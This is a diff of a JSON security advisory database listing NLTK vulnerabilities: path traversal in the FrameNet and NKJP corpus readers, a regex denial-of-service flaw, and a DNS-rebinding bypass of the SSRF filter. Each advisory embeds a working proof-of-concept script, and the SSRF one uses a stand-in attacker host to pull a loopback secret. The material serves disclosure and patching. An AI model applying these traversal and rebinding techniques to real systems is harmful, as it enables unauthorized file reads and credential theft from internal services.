+                    "3.6",
+                    "3.6.1",
+                    "3.6.2",
+                    "3.6.3",
+                    "3.6.4",
+                    "3.6.5",
+                    "3.6.6",
+                    "3.6.7",
+                    "3.7",
+                    "3.8",
+                    "3.8.1",
+                    "3.9",
+                    "3.9.1",
+                    "3.9.2",
+                    "3.9.3",
+                    "3.9.4",
+                    "3.9b1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-12074",
+                "GHSA-xh95-f55m-82fw"
+              ],
+              "details": "### Summary\n`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox — including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.\n\n\n### Details\n`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.\n\nThe same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:\n- `doc()` — uses the index entry `filename` field\n- the lexical-unit file loader — uses the `lexUnit` ID attribute\n\nThese are reachable through a malicious or attacker-modified FrameNet corpus index.\n\n### PoC\n```python\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport warnings\nfrom pathlib import Path\n\nwarnings.filterwarnings(\"ignore\")\n\n# --- Turn the documented strict sandbox ON, before importing the reader. ---\nimport nltk.pathsec as ps\nps.ENFORCE = True\n\nimport nltk\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError\n\nFRAME_XML = (\n    '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\\n'\n    '\u003cframe xmlns=\"http://framenet.icsi.berkeley.edu\" ID=\"1337\" name=\"pwned\"\u003e\\n'\n    \"\u003cdefinition\u003eSECRET-OUT-OF-ROOT-CONTENT\u003c/definition\u003e\\n\"\n    \"\u003c/frame\u003e\\n\"\n)\n\nBANNER = \"\"\"\\\n===========================================================\n NLTK FramenetCorpusReader.frame() Path Traversal PoC\n nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}\n===========================================================\"\"\".format(\n    ver=nltk.__version__, enforce=ps.ENFORCE\n)\n\n\ndef build_corpus():\n    \"\"\"Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root.\"\"\"\n    base = Path(tempfile.mkdtemp(prefix=\"fn_poc_\"))\n    root = base / \"corpora\" / \"framenet\"\n    for d in (\"frame\", \"fulltext\", \"lu\"):\n        (root / d).mkdir(parents=True)\n    (root / \"frameIndex.xml\").write_text(\n        '\u003c?xml version=\"1.0\"?\u003e\u003cframeIndex\u003e\u003c/frameIndex\u003e'\n    )\n    (root / \"frRelation.xml\").write_text(\n        '\u003c?xml version=\"1.0\"?\u003e\u003cframeRelations\u003e\u003c/frameRelations\u003e'\n    )\n\n    # A frame-shaped XML file OUTSIDE the corpus root (the \"sensitive\" target).\n    secret = base / \"private\"\n    secret.mkdir()\n    (secret / \"secret.xml\").write_text(FRAME_XML)\n\n    return base, root, secret / \"secret.xml\"\n\n\ndef main():\n    print(BANNER)\n    base, root, secret_path = build_corpus()\n    print(f\"[*] corpus root : {root}\")\n    print(f\"[*] secret file : {secret_path}  (OUTSIDE the root)\\n\")\n\n    fn = FramenetCorpusReader(str(root), [])\n\n    # Attacker-controlled frame name climbs out of \u003croot\u003e/frame/ up to \u003cbase\u003e/private/secret.xml\n    evil = os.path.join(\"..\", \"..\", \"..\", \"private\", \"secret\")\n    print(f\"[*] calling   fn.frame({evil!r})\")\n\n    try:\n        f = fn.frame(evil)\n        definition = f[\"definition\"]\n        if \"SECRET-OUT-OF-ROOT-CONTENT\" in definition:\n            print(\"\\n  [VULN] out-of-root file was read and returned to caller\")\n            print(f\"         frame name : {evil}\")\n            print(f\"         frame ID   : {f['ID']}   name: {f['name']}\")\n            print(f\"         definition : {definition}\")\n            print(f\"\\n  -\u003e nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}\")\n            verdict = \"VULNERABLE\"\n        else:\n            print(f\"\\n  [?] frame() returned but content unexpected: {definition!r}\")\n            verdict = \"INCONCLUSIVE\"\n    except FramenetError as e:\n        # Patched build (#3581): _reject_unsafe_path_component raises before open().\n        print(f\"\\n  [SAFE] FramenetError: {e}\")\n        print(\"         traversal rejected before any file was opened (patched)\")\n        verdict = \"NOT VULNERABLE\"\n    except Exception as e:\n        print(f\"\\n  [SAFE] {type(e).__name__}: {e}\")\n        verdict = \"NOT VULNERABLE\"\n\n    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.\n    print(\"\\n[CONTROL] benign absent name should be 'Unknown frame':\")\n    try:\n        fn.frame(\"Definitely_Not_A_Frame\")\n        print(\"  [?] unexpectedly succeeded\")\n    except Exception as e:\n        print(f\"  ok -\u003e {type(e).__name__}: {e}\")\n\n    print(\"\\n\" + \"=\" * 59)\n    print(f\" Result: {verdict}  (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 59)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n\n### Impact\n- **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.\n- **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving \"read any XML file the process can read.\" Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.\n- **Silent bypass of an advertised boundary.** NLTK's `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read — silently, with no error or warning.\n- **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.\n- **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.",
+              "id": "PYSEC-2026-3584",
+              "modified": "2026-08-04T14:30:27.713135809Z",
+              "published": "2026-08-04T11:34:45.939354Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nltk/nltk"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://pypi.org/project/nltk"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://github.com/advisories/GHSA-xh95-f55m-82fw"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-12074"
+                }
+              ],
+              "schema_version": "1.8.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
                     "source": "https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-597.yaml"
                   },
                   "ecosystem_specific": {},
@@ -12434,7 +12970,8 @@
                 }
               ],
               "aliases": [
-                "CVE-2026-12072"
+                "CVE-2026-12072",
+                "PYSEC-2026-3581"
               ],
               "database_specific": {
                 "cwe_ids": [
@@ -12447,7 +12984,7 @@
               },
               "details": "### Summary\n   A path-traversal vulnerability in `NKJPCorpusReader` allows an attacker who can\n   influence the `fileids` argument of its public read methods (`header`, `raw`,\n   `words`, `sents`, `tagged_words`) to read files outside the corpus root. The\n   reader builds the file path with no containment check and opens it with the\n   builtin `open()`, so it bypasses NLTK's `nltk.pathsec` sandbox — including the\n   strict `ENFORCE = True` mode that `SECURITY.md` recommends for web/multi-tenant\n   deployments. `header()` returns the parsed content of the out-of-root file to\n   the caller (arbitrary file read).\n\n   ### Details\n   `SECURITY.md` promises that file access is \"validated against allowed NLTK data\n   directories\" and that with `nltk.pathsec.ENFORCE = True` \"unauthorized file\n   access … will raise `PermissionError`.\" That guarantee is enforced via\n   `FileSystemPathPointer.open()` / `CorpusReader.open()`, which call\n   `nltk.pathsec.validate_path(...)`.\n\n   `NKJPCorpusReader` never uses that protected path. In\n   `nltk/corpus/reader/nkjp.py`:\n\n   - `add_root()` builds the path by **plain string concatenation** with no\n     normalization or containment check:\n     ```python\n     def add_root(self, fileid):          # lines 96-102\n         if self.root in fileid:\n             return fileid                # attacker-controlled value returned unchanged\n         return self.root + fileid        # plain concat, '..' not stripped\n     ```\n   - The header view appends a fixed basename and passes the string straight into\n     the corpus view (which opens it with the builtin `open()`):\n     ```python\n     class NKJPCorpus_Header_View(XMLCorpusView):   # line 181\n         def __init__(self, filename, **kwargs):\n             XMLCorpusView.__init__(self, filename + \"header.xml\", self.tagspec)  # line 189\n     ```\n   - The other modes reach the filesystem through `XML_Tool`, which uses a raw\n     `os.path.join` (not the hardened `FileSystemPathPointer.join()`) and the\n     builtin `open()`:\n     ```python\n     class XML_Tool:                                  # line 243\n         def __init__(self, root, filename):\n             self.read_file = os.path.join(root, filename)   # line 251\n         def build_preprocessed_file(self):\n             fr = open(self.read_file)                        # line 256 — pathsec never consulted\n     ```\n\n   Because `open()` is the builtin (not `PathPointer.open()`), the `pathsec`\n   sentinel is never invoked, so `ENFORCE = True` does not block the access. For\n   comparison, the safe API `CorpusReader.open()` (`nltk/corpus/reader/api.py:222`)\n   rejects `..`/absolute fileids and calls `validate_path(..., required_root=...)`\n   before opening — `NKJPCorpusReader` simply does not go through it.\n\n   ### PoC\n   Tested against `nltk==3.9.4` (latest PyPI release) and current `develop`.\n\n   ```\n   pip install \"nltk==3.9.4\"\n   python3 poc.py\n   ```\n\n   `poc.py`:\n   ```python\n   import builtins, os, shutil, tempfile, warnings\n   warnings.simplefilter(\"ignore\")\n   import nltk, nltk.pathsec as pathsec\n   from nltk.corpus.reader.nkjp import NKJPCorpusReader\n\n   print(\"nltk\", nltk.__version__)\n\n   # A legitimate, empty NKJP corpus root (what a real app has).\n   root = tempfile.mkdtemp(prefix=\"nkjp_corpus_root_\")\n   os.makedirs(os.path.join(root, \"sample\"), exist_ok=True)\n   open(os.path.join(root, \"sample\", \"header.xml\"), \"w\").write(\"\u003cx/\u003e\")\n\n   # The attacker's target: a file OUTSIDE the corpus root.\n   secret_dir = tempfile.mkdtemp(prefix=\"OUTSIDE_ROOT_\")\n   open(os.path.join(secret_dir, \"header.xml\"), \"w\").write(\n   \"\u003cteiHeader\u003e\u003cfileDesc\u003e\u003csourceDesc\u003e\u003cbibl\u003e\"\n   \"\u003ctitle\u003eSECRET-API-KEY=sk-live-DEADBEEF\u003c/title\u003e\"\n       \"\u003c/bibl\u003e\u003c/sourceDesc\u003e\u003c/fileDesc\u003e\u003c/teiHeader\u003e\")\n\n   # Enable the strict mode SECURITY.md recommends for web / multi-tenant.\n   pathsec.ENFORCE = True\n   print(\"ENFORCE =\", pathsec.ENFORCE)\n\n   # Prove the out-of-root read and that pathsec is never consulted.\n   opened = []; real = builtins.open\n   builtins.open = lambda f, *a, **k: (opened.append(str(f)), real(f, *a, **k))[1]\n\n   reader = NKJPCorpusReader(root=root + \"/\", fileids=\"sample\")\n   # Attacker-controlled `fileids`; '..' escapes the corpus root:\n   evil = root + \"/../../../../../../..\" + secret_dir + \"/\"\n   try:\n       result = reader.header(fileids=[evil])\n   finally:\n       builtins.open = real\n\n   print(\"opened outside root:\", [p for p in opened if \"OUTSIDE_ROOT_\" in p][:1])\n   print(\"disclosed content  :\", result[0][\"title\"])\n   shutil.rmtree(root, ignore_errors=True); shutil.rmtree(secret_dir, ignore_errors=True)\n   ```\n\n   Output (unmodified):\n   ```\n   nltk 3.9.4\n   ENFORCE = True\n   opened outside root: ['/tmp/nkjp_corpus_root_XXXX/../../../../../../../tmp/OUTSIDE_ROOT_YYYY/header.xml']\n   disclosed content  : SECRET-API-KEY=sk-live-DEADBEEF\n   ```\n   With `ENFORCE = True`, NLTK opened a file outside the corpus root via the\n   builtin `open()` (no `PermissionError`, no warning) and returned its content.\n\n   ### Impact\n   This is a path traversal (CWE-22) leading to arbitrary file read. Any\n   application that passes attacker-influenced values into `NKJPCorpusReader`'s\n   `fileids` (e.g. letting a user choose which corpus document to read) is\n   affected; the attacker can escape the corpus root and read files elsewhere on\n   the host, defeating the `ENFORCE=True` sandbox.\n\n   Honest scoping: `header()` discloses the content of out-of-root files named\n   `header.xml` containing NKJP header XML. `raw()`/`words()`/`sents()` also open\n   and read an arbitrary out-of-root file (proven by intercepting `open()`), but a\n   separate pre-existing bug in `XML_Tool` (writing `str` to a binary\n   `NamedTemporaryFile`) suppresses their return value on current Python, so for\n   those modes the impact is arbitrary file open/read. The attacker chooses the\n   directory freely; a fixed basename is appended per mode. The same\n   \"build-path-then-builtin-open, skipping pathsec\" anti-pattern also appears in\n   `xmldocs.py:161`, `util.py:212,215`, `crubadan.py:78,97`, `lin.py:43`,\n   `ipipan.py:191`, `pl196x.py:110` and is worth fixing as a class.",
               "id": "GHSA-6hm5-jgcp-p838",
-              "modified": "2026-07-31T17:00:21.718036171Z",
+              "modified": "2026-08-06T15:11:53.284323541Z",
               "published": "2026-07-31T16:50:55Z",
               "references": [
                 {
@@ -12458,6 +12995,9 @@
                   "type": "PACKAGE",
                   "url": "https://github.com/nltk/nltk"
                 }
+              ],
+              "related": [
+                "CGA-6qcw-hj3f-7r2j"
               ],
               "schema_version": "1.7.5",
               "severity": [
@@ -13008,7 +13548,8 @@
                 }
               ],
               "aliases": [
-                "CVE-2026-12061"
+                "CVE-2026-12061",
+                "PYSEC-2026-3582"
               ],
               "database_specific": {
                 "cwe_ids": [
@@ -13021,7 +13562,7 @@
               },
               "details": "### Summary\n`ReviewsCorpusReader` extracts feature annotations of the form *label* followed by a bracketed signed digit (e.g. a label then `[+2]`) from each review line, using the module-level `FEATURES` regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal `[`. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs `reviews()`, `features()`, and `sents()`. \n\n\n### Details\nThe label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal `[`. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the *n* starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. `re.findall` repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.\n\n### PoC\n```\nimport multiprocessing as mp\nimport re\nimport time\n\n# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---\nFEATURES_VULN = re.compile(r\"((?:(?:\\w+\\s)+)?\\w+)\\[((?:\\+|\\-)\\d)\\]\")\n\n# --- Bounded variant from the fix (PR #3583): cap the per-label word run.\n#     A generous bound (real feature labels are short noun phrases) makes the\n#     run linear while never affecting legitimate corpora. ---\nWORD_BOUND = 50\nFEATURES_FIXED = re.compile(\n    r\"((?:(?:\\w+\\s){0,%d})?\\w+)\\[((?:\\+|\\-)\\d)\\]\" % WORD_BOUND\n)\n\nTIMEOUT = 20.0  # seconds, per measurement\nSIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line\n\n\ndef _bad_line(n_words):\n    \"\"\"A long line of plain words with NO trailing bracketed annotation.\"\"\"\n    return (\"word \" * n_words).rstrip()\n\n\ndef _worker(pattern_str, line, q):\n    pat = re.compile(pattern_str)\n    t0 = time.perf_counter()\n    pat.findall(line)\n    q.put(time.perf_counter() - t0)\n\n\ndef timed_findall(pattern, line, timeout=TIMEOUT):\n    \"\"\"Run pattern.findall(line) in a killable process; return seconds or None (timeout).\"\"\"\n    q = mp.Queue()\n    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))\n    p.start()\n    p.join(timeout)\n    if p.is_alive():\n        p.terminate()\n        p.join()\n        return None\n    return q.get() if not q.empty() else None\n\n\ndef bench(label, pattern):\n    print(f\"\\n[{label}]  pattern: {pattern.pattern}\")\n    print(f\"  {'words':\u003e7} {'~bytes':\u003e8}   {'time':\u003e12}   {'x prev':\u003e7}\")\n    prev = None\n    for n in SIZES:\n        line = _bad_line(n)\n        t = timed_findall(pattern, line)\n        if t is None:\n            print(f\"  {n:\u003e7} {len(line):\u003e8}   {'\u003e%.0fs TIMEOUT' % TIMEOUT:\u003e12}   {'--':\u003e7}\")\n            prev = None\n        else:\n            ratio = f\"{t/prev:.1f}x\" if prev else \"--\"\n            print(f\"  {n:\u003e7} {len(line):\u003e8}   {t*1000:\u003e9.1f} ms   {ratio:\u003e7}\")\n            prev = t\n\n\ndef parity_check():\n    \"\"\"The bound must NOT change extraction on a realistic annotated line.\"\"\"\n    real = (\n        \"the picture quality[+2] and battery life[+1] are great but \"\n        \"the lens cap[-1] feels cheap and the menu system[-2] is slow\"\n    )\n    a = FEATURES_VULN.findall(real)\n    b = FEATURES_FIXED.findall(real)\n    print(\"\\n[parity] realistic annotated line — extraction must be identical\")\n    print(f\"  vulnerable regex -\u003e {a}\")\n    print(f\"  bounded   regex  -\u003e {b}\")\n    print(f\"  identical: {a == b}\")\n    return a == b\n\n\ndef main():\n    print(\"=\" * 66)\n    print(\" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)\")\n    print(\"=\" * 66)\n    print(f\" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}\")\n\n    bench(\"VULNERABLE  reviews.py L70-71\", FEATURES_VULN)\n    bench(\"BOUNDED     fix #3583\", FEATURES_FIXED)\n    same = parity_check()\n\n    print(\"\\n\" + \"=\" * 66)\n    print(\" Vulnerable: ~4x time per input doubling  =\u003e O(n^2) quadratic ReDoS\")\n    print(\" Bounded:    ~2x time per input doubling  =\u003e O(n)   linear, stays in ms\")\n    print(f\" Extraction parity on real annotations preserved: {same}\")\n    print(\" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().\")\n    print(\"=\" * 66)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Impact\nDenial of service. Processing a single crafted line through `ReviewsCorpusReader` consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.",
               "id": "GHSA-fg7f-2386-8897",
-              "modified": "2026-07-31T17:00:20.623483859Z",
+              "modified": "2026-08-06T15:11:53.004587618Z",
               "published": "2026-07-31T16:51:09Z",
               "references": [
                 {
@@ -13032,6 +13573,9 @@
                   "type": "PACKAGE",
                   "url": "https://github.com/nltk/nltk"
                 }
+              ],
+              "related": [
+                "CGA-w2rm-mrhc-xc43"
               ],
               "schema_version": "1.7.5",
               "severity": [
@@ -13725,7 +14269,8 @@
                 }
               ],
               "aliases": [
-                "CVE-2026-12075"
+                "CVE-2026-12075",
+                "PYSEC-2026-3583"
               ],
               "database_specific": {
                 "cwe_ids": [
@@ -13738,7 +14283,7 @@
               },
               "details": "### Summary\n`nltk.pathsec` provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict `ENFORCE` mode for security-sensitive environments. The filter is bypassable by DNS rebinding: `validate_network_url()` resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under `nltk.pathsec.ENFORCE = True`.\n\n\n### Details\n`urlopen()` validates, then hands the raw hostname to `urllib`, which performs a second name resolution deep in the connection layer (`http.client.HTTPConnection.connect` → `socket.create_connection` → `socket.getaddrinfo`). The validation-side and connection-side resolutions are fully independent code paths with independent caches:\n\n1. `validate_network_url()` calls `_resolve_hostname(parsed.hostname)` and checks each returned IP against loopback/link-local/multicast/private, blocking under `ENFORCE`. (Resolution #1.)\n2. `urlopen()` then calls `build_opener(...).open(url)` with the original URL (raw hostname), so `urllib` resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)\n\n`_resolve_hostname` is decorated with `lru_cache` and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's `getaddrinfo` does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.\n\n\n### PoC\n```python\nimport socket\nimport threading\nimport warnings\nfrom collections import defaultdict\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nwarnings.filterwarnings(\"ignore\")\n\nimport nltk\nimport nltk.pathsec as ps\n\nps.ENFORCE = True  # the documented strict SSRF sandbox\n\nATTACKER_HOST = \"rebind.attacker.test\"   # attacker-controlled authoritative DNS\nPUBLIC_IP = \"93.184.216.34\"              # public address served for the validation lookup\nSECRET = b\"TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS\"\n\n\n# --- A loopback-only \"internal service\" (stands in for 169.254.169.254 / admin UI) ---\nclass _Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"text/plain\")\n        self.send_header(\"Content-Length\", str(len(SECRET)))\n        self.end_headers()\n        self.wfile.write(SECRET)\n\n    def log_message(self, *a):\n        pass\n\n\ndef start_internal_server():\n    srv = HTTPServer((\"127.0.0.1\", 0), _Handler)\n    threading.Thread(target=srv.serve_forever, daemon=True).start()\n    return srv.server_address[1]  # ephemeral port\n\n\n# --- Model the TTL-0 rebinding record at the resolver layer ---\n_real_getaddrinfo = socket.getaddrinfo\n_lookups = defaultdict(int)\n\n\ndef _rebinding_getaddrinfo(host, port, *args, **kwargs):\n    if host == ATTACKER_HOST:\n        n = _lookups[host]\n        _lookups[host] += 1\n        ip = PUBLIC_IP if n == 0 else \"127.0.0.1\"   # 1st=public (validate), then loopback (connect)\n        p = port if isinstance(port, int) else 0\n        kind = \"VALIDATION -\u003e public\" if n == 0 else \"CONNECT    -\u003e loopback\"\n        print(f\"    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})\")\n        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, \"\", (ip, p))]\n    return _real_getaddrinfo(host, port, *args, **kwargs)\n\n\ndef fetch(url):\n    with ps.urlopen(url, timeout=5) as r:\n        return r.read()\n\n\ndef main():\n    print(\"=\" * 62)\n    print(f\" NLTK pathsec DNS-rebinding SSRF bypass PoC\")\n    print(f\" nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}\")\n    print(\"=\" * 62)\n\n    port = start_internal_server()\n    print(f\"[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\\n\")\n\n    socket.getaddrinfo = _rebinding_getaddrinfo\n    ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process\n    try:\n        # ---- Control: a DIRECT loopback URL must be blocked by the filter ----\n        print(\"[1] CONTROL: direct loopback URL (filter must block this)\")\n        direct = f\"http://127.0.0.1:{port}/\"\n        try:\n            fetch(direct)\n            print(f\"    [?] unexpected: {direct} was NOT blocked\\n\")\n            control_ok = False\n        except PermissionError as e:\n            print(f\"    [OK] blocked -\u003e PermissionError: {e}\\n\")\n            control_ok = True\n\n        # ---- Attack: rebinding hostname bypasses the same filter ----\n        print(\"[2] ATTACK: rebinding hostname (public at validate, loopback at connect)\")\n        evil = f\"http://{ATTACKER_HOST}:{port}/\"\n        print(f\"    fetching {evil}\")\n        try:\n            body = fetch(evil)\n            leaked = SECRET in body\n            print(f\"    body returned to caller: {body!r}\")\n            if leaked:\n                print(\"\\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen\")\n                print(f\"         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1\")\n                print(f\"         non-blind SSRF despite ENFORCE = {ps.ENFORCE}\")\n                verdict = \"VULNERABLE\"\n            else:\n                print(\"\\n  [?] fetch succeeded but secret marker not present\")\n                verdict = \"INCONCLUSIVE\"\n        except PermissionError as e:\n            # Patched build: validate against the connect-time IP (or pin/resolve-once).\n            print(f\"\\n  [SAFE] blocked -\u003e PermissionError: {e}\")\n            verdict = \"NOT VULNERABLE\"\n    finally:\n        socket.getaddrinfo = _real_getaddrinfo\n\n    print(\"\\n\" + \"=\" * 62)\n    print(f\" Control (direct loopback blocked): {control_ok}\")\n    print(f\" Result: {verdict}   (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 62)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n### Impact\n- **Full-response (non-blind) SSRF.** Because the fetched body is returned to the caller (e.g. `nltk.data.load` with `format=\"raw\"`), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise.\n- **Bypass of an explicit security control.** It defeats the `nltk.pathsec` SSRF filter, including the `ENFORCE` mode that NLTK's documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the `lru_cache` annotation claiming to mitigate rebinding makes the false assurance worse.",
               "id": "GHSA-qvv7-cg9c-w4x3",
-              "modified": "2026-07-31T17:00:21.024112203Z",
+              "modified": "2026-08-06T15:11:52.346921403Z",
               "published": "2026-07-31T16:51:29Z",
               "references": [
                 {
@@ -13749,6 +14294,9 @@
                   "type": "PACKAGE",
                   "url": "https://github.com/nltk/nltk"
                 }
+              ],
+              "related": [
+                "CGA-j6j3-v78w-w483"
               ],
               "schema_version": "1.7.5",
               "severity": [
@@ -14119,7 +14667,8 @@
                 }
               ],
               "aliases": [
-                "CVE-2026-12074"
+                "CVE-2026-12074",
+                "PYSEC-2026-3584"
               ],
               "database_specific": {
                 "cwe_ids": [
@@ -14132,7 +14681,7 @@
               },
               "details": "### Summary\n`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox — including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.\n\n\n### Details\n`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.\n\nThe same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:\n- `doc()` — uses the index entry `filename` field\n- the lexical-unit file loader — uses the `lexUnit` ID attribute\n\nThese are reachable through a malicious or attacker-modified FrameNet corpus index.\n\n### PoC\n```python\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport warnings\nfrom pathlib import Path\n\nwarnings.filterwarnings(\"ignore\")\n\n# --- Turn the documented strict sandbox ON, before importing the reader. ---\nimport nltk.pathsec as ps\nps.ENFORCE = True\n\nimport nltk\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError\n\nFRAME_XML = (\n    '\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\\n'\n    '\u003cframe xmlns=\"http://framenet.icsi.berkeley.edu\" ID=\"1337\" name=\"pwned\"\u003e\\n'\n    \"\u003cdefinition\u003eSECRET-OUT-OF-ROOT-CONTENT\u003c/definition\u003e\\n\"\n    \"\u003c/frame\u003e\\n\"\n)\n\nBANNER = \"\"\"\\\n===========================================================\n NLTK FramenetCorpusReader.frame() Path Traversal PoC\n nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}\n===========================================================\"\"\".format(\n    ver=nltk.__version__, enforce=ps.ENFORCE\n)\n\n\ndef build_corpus():\n    \"\"\"Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root.\"\"\"\n    base = Path(tempfile.mkdtemp(prefix=\"fn_poc_\"))\n    root = base / \"corpora\" / \"framenet\"\n    for d in (\"frame\", \"fulltext\", \"lu\"):\n        (root / d).mkdir(parents=True)\n    (root / \"frameIndex.xml\").write_text(\n        '\u003c?xml version=\"1.0\"?\u003e\u003cframeIndex\u003e\u003c/frameIndex\u003e'\n    )\n    (root / \"frRelation.xml\").write_text(\n        '\u003c?xml version=\"1.0\"?\u003e\u003cframeRelations\u003e\u003c/frameRelations\u003e'\n    )\n\n    # A frame-shaped XML file OUTSIDE the corpus root (the \"sensitive\" target).\n    secret = base / \"private\"\n    secret.mkdir()\n    (secret / \"secret.xml\").write_text(FRAME_XML)\n\n    return base, root, secret / \"secret.xml\"\n\n\ndef main():\n    print(BANNER)\n    base, root, secret_path = build_corpus()\n    print(f\"[*] corpus root : {root}\")\n    print(f\"[*] secret file : {secret_path}  (OUTSIDE the root)\\n\")\n\n    fn = FramenetCorpusReader(str(root), [])\n\n    # Attacker-controlled frame name climbs out of 